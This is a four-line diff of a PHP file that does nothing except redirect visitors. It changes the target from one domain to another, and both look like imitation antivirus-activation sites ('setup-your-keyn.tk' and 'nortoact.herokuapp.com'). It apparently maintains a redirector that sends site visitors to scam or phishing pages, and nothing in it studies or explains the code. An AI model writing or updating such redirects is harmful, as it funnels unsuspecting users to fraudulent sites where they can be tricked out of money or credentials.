@@ -1,4 +1,4 @@
 <?php
-header("Location: https://setup-your-keyn.tk");
+header("Location:http://nortoact.herokuapp.com/");
 die();
 ?>
